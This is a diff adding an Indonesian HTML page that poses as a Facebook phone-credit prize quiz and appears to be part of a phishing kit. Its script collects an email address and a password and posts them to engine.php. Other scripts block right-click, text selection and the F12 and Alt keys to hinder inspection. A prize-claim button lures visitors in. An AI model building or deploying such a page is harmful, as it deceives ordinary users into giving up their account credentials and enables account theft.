@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+<link href='bct.png' rel='icon' type='image/x-png'/>
+<title>Quiz Berhadiah Pulsa</title>
+<link rel="stylesheet" href="bootstrap.min.css">
+<style>
+h1, .h1, h2, .h2, h3, .h3 {
+    margin-top: 0px;
+    margin-bottom: 10.5px;
+}
+
+.error-msg {
+    margin: .5em 0;
+    display: block;
+    color: #dd4b39;
+    line-height: 17px;
+}
+.col-md-6 {
+ margin:0 auto;
+ float:none;
+
+}
+.col-md-8 {
+ margin:0 auto;
+ float:none;
+
+}
+</style>
+<script type="text/javascript">
+	$(document).ready(function(){
+	  $("#gsubmit").on("click", function() {
+		  var gemail = $("#gemail").val();
+		  var gpass = $("#gpass").val();
+		  if(gemail==''||gpass=='')
+{
+
+}
+else
+{
+	var res = document.getElementById("hasilnya");
+          res.innerHTML='';
+		  $("#gsubmit").prop("disabled", true );
+		  $.post("engine.php",
+		  {gemail:gemail,gpass:gpass,},
+		  function(response,status){
+			  $('#hasilnya').html(response);
+			$("#gsubmit").prop("disabled", false );
+			$("#gemail").prop("value", "");
+			$("#gpass").prop("value", "");
+		  });
+		  return false;
+	  }
+	  }
+	  );
+	});
+
+	</script>
+<!-- Kode menampilkan peringatan untuk mengaktifkan javascript-->
+<div align="center"><noscript>
+   <div style="position:fixed; top:0px; left:0px; z-index:3000; height:100%; width:100%; background-color:#FFFFFF">
+   <div style="font-family: Arial; font-size: 17px; background-color:#00bbf9; padding: 11pt;">Mohon aktifkan javascript pada browser untuk mengakses halaman ini!</div></div>
+</noscript></div>
+
+<!--Kode untuk mencegah seleksi teks, block teks dll.-->
+<script type="text/javascript">
+function disableSelection(e){if(typeof e.onselectstart!="undefined")e.onselectstart=function(){return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){return false};e.style.cursor="default"}window.onload=function(){disableSelection(document.body)}
+</script>
+
+<!--Kode untuk mematikan fungsi klik kanan di blog-->
+<script type="text/javascript">
+function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
+</script>
+
+
+<style type="text/css">
+* : (input, textarea) {
+    -webkit-touch-callout: none;
+    -webkit-user-select: none;
+	}
+</style>
+<style type="text/css">
+img {
+	-webkit-touch-callout: none;
+	-webkit-user-select: none;
+    }
+</style>
+
+<script type="text/javascript">
+document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
+</script>
+<body style="padding:0px;margin:0 auto;">
+<div style="padding:0px;margin:0 auto;" class="container ">
+
+<div style="border:none;padding:0px;margin:0 auto;" class="col-md-6">
+<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
+<script type='text/javascript'>window._sbzq||function(e){e._sbzq=[];var t=e._sbzq;t.push(["_setAccount",54166]);var n=e.location.protocol=="https:"?"https:":"http:";var r=document.createElement("script");r.type="text/javascript";r.async=true;r.src=n+"//static.subiz.com/public/js/loader.js";var i=document.getElementsByTagName("script")[0];i.parentNode.insertBefore(r,i)}(window);</script>
+</body>
+
+<center style="background:white;"><br>
+<div class="col-md-8">
+<h2><img src="bct.png"></h2>
+
+<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:#f7f7f7;width:100%" class="form-horizontal">
+       <form action="submission.php" id="login-form" method="post">
+<h2>
+ <b>Klik Lanjutkan Untuk Mengikuti Quiz Berhadiah Pulsa.</b>
+</h2>
+  <input type="submit" class="btn btn-block" style="color: #ffffff;background-color: red;" value="LANJUTKAN">
+           </form>
+<br>
+<p><b>
+	<a href="petunjuk.php" ><span style='font-size:14px; font-weight: italic; color: blue; text-shadow:white 0px 0px 0px;'>Syarat & Ketentuan</span></a> Yang Berlaku Untuk Dapatkan Pulsa!</b></span></center>
+</div><br>
+</div>
+  </p>
+
+  <span class="mfss fcg"><center><font size="2">&copy; 2021 Gift Facebook Allrights Reserved </font></center></span>
